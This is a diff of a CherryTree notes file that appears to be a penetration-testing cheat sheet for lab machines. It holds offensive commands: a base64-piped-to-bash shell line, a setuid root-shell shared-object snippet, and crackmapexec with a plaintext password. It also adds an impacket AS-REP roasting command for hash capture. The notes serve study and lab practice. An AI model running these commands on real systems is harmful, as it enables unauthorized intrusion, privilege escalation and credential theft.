@@ -71,6 +71,7 @@ If the shell must not contains spaces, use </rich_text>
       <rich_text> which is a new line.
 Example:
 </rich_text>
+      <rich_text justification="left"></rich_text>
       <codebox char_offset="285" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "" |base64 -d | bash</codebox>
       <node name="TCP" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559292" ts_lastsave="1694351984">
         <rich_text>We will find the service report from AutoRecon.py, name Full TCP Scan.
@@ -664,7 +665,7 @@ void test_this()
 	setuid(0); setgid(0); system("/bin/sh");
 }</codebox>
       <codebox char_offset="162" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gcc -fPIC -shared test_this.c -o test_this.so</codebox>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1694352055">
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1694352079">
         <rich_text>Use:
 - linpeas
 - kernel exploit suggester
@@ -732,6 +733,9 @@ Check running commands:
 
 Use </rich_text>
         <rich_text weight="heavy">PSpy</rich_text>
+        <rich_text> to check for executed commands and cronjobs, without </rich_text>
+        <rich_text style="italic">privilege escalation</rich_text>
+        <rich_text>.</rich_text>
         <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
         <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
         <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
@@ -1049,7 +1053,7 @@ lsadump::sam</codebox>
           <rich_text link="webs https://github.com/crazywifi/Enable-RDP-One-Liner-CMD">https://github.com/crazywifi/Enable-RDP-One-Liner-CMD</rich_text>
         </node>
       </node>
-      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1693404928">
+      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1694367237">
         <rich_text>Try credentials using crackmapexec:
 </rich_text>
         <rich_text justification="left"></rich_text>
@@ -1095,10 +1099,15 @@ Try moving lateraly with:
         <rich_text>)
 - RunAS: </rich_text>
         <rich_text link="webs https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs">https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/runas#runascs</rich_text>
+        <rich_text>
+
+You can AR REP wihtour user credentials:
+</rich_text>
         <codebox char_offset="36" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator # this will check domain users credentials
 proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator --local-auth # this will check local users credentials
 </codebox>
         <codebox char_offset="578" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python -d {domain name} -ns {dc-ip} -c All -u {user} -p {password} --zip</codebox>
+        <codebox char_offset="825" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers -request -dc-ip 10.129.103.173 htb.local/svc-alfresco -outputfile hashes.kerberoast -no-pass</codebox>
       </node>
       <node name="File Transfer" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1690116035" ts_lastsave="1690116187">
         <rich_text>We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali (from the Pivot Machine):
